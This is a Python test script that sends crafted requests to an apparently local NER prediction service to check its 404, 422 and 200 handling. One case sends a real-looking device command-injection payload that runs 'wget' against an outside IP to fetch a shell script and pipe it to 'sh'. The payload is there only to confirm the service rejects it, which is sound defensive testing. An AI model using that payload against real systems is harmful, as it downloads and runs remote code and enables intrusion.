#!/usr/bin/env python3
import argparse
import json
import sys
from typing import List, Optional

import requests


def _print_case(title: str, r: requests.Response) -> None:
    try:
        body = r.json()
    except Exception:
        body = r.text[:200]
    print(f"\n== {title} ==")
    print(f"{r.request.method} {r.request.url}")
    print(f"Status: {r.status_code}")
    print(f"Body: {body}")


def _append_csv(path: Optional[str], title: str, r: requests.Response) -> None:
    if not path:
        return
    try:
        with open(path, "a", encoding="utf-8") as f:
            try:
                body_json = r.json()
                body_str = json.dumps(body_json, ensure_ascii=False)
            except Exception:
                body_str = (r.text or "").replace("\n", "\\n")
            f.write(f"{title};{r.request.method};{r.request.url};{r.status_code};{body_str}\n")
    except Exception:
        pass


def run(base_url: str, log_csv: Optional[str]) -> int:
    s = requests.Session()
    if log_csv:
        with open(log_csv, "w", encoding="utf-8") as f:
            f.write("case;method;url;status;body\n")

    # 404: unknown paths
    r = s.get(base_url.rstrip("/") + "/nope")
    _print_case("404 unknown GET", r)
    _append_csv(log_csv, "404 unknown GET", r)

    r = s.post(base_url.rstrip("/") + "/unknown/api", json={"anything": "value"})
    _print_case("404 unknown POST", r)
    _append_csv(log_csv, "404 unknown POST", r)

    r = s.post(
        base_url.rstrip("/")
        + "/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=wget%20http%3A%2F%2F45.125.66.56%2Ftbk.sh%20-O-%20%7C%20sh"
    )
    _print_case("404 exploit-like POST", r)
    _append_csv(log_csv, "404 exploit-like POST", r)

    # 422: invalid JSON for predict
    r = s.post(base_url.rstrip("/") + "/api/predict", json={})
    _print_case("422 predict missing input", r)
    _append_csv(log_csv, "422 predict missing input", r)

    r = s.post(base_url.rstrip("/") + "/api/predict", json={"input": 123})
    _print_case("422 predict wrong type number", r)
    _append_csv(log_csv, "422 predict wrong type number", r)

    r = s.post(base_url.rstrip("/") + "/api/predict", json={"input": ["молоко", "сыр"]})
    _print_case("422 predict wrong type array", r)
    _append_csv(log_csv, "422 predict wrong type array", r)

    # 422: invalid JSON for predict_batch
    r = s.post(base_url.rstrip("/") + "/api/predict_batch", json={})
    _print_case("422 predict_batch missing inputs", r)
    _append_csv(log_csv, "422 predict_batch missing inputs", r)

    r = s.post(base_url.rstrip("/") + "/api/predict_batch", json={"inputs": []})
    _print_case("422 predict_batch empty inputs", r)
    _append_csv(log_csv, "422 predict_batch empty inputs", r)

    r = s.post(base_url.rstrip("/") + "/api/predict_batch", json={"inputs": ["молоко", 123]})
    _print_case("422 predict_batch mixed types", r)
    _append_csv(log_csv, "422 predict_batch mixed types", r)

    # 200 / fail-safe typical requests
    r = s.post(base_url.rstrip("/") + "/api/predict", json={"input": "   "})
    _print_case("200 predict empty-trimmed", r)
    _append_csv(log_csv, "200 predict empty-trimmed", r)

    r = s.post(base_url.rstrip("/") + "/api/predict", json={"input": "молоко\u200b\u200d 2.5%\u00a0домик"})
    _print_case("200 predict confusables", r)
    _append_csv(log_csv, "200 predict confusables", r)

    # favicon
    r = s.get(base_url.rstrip("/") + "/favicon.ico")
    _print_case("204 favicon", r)
    _append_csv(log_csv, "204 favicon", r)

    return 0


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Send crafted error samples to X5 NER Service")
    ap.add_argument("--base_url", default="http://localhost:8000")
    ap.add_argument("--log_csv", default=None)
    args = ap.parse_args()

    sys.exit(run(args.base_url, args.log_csv))
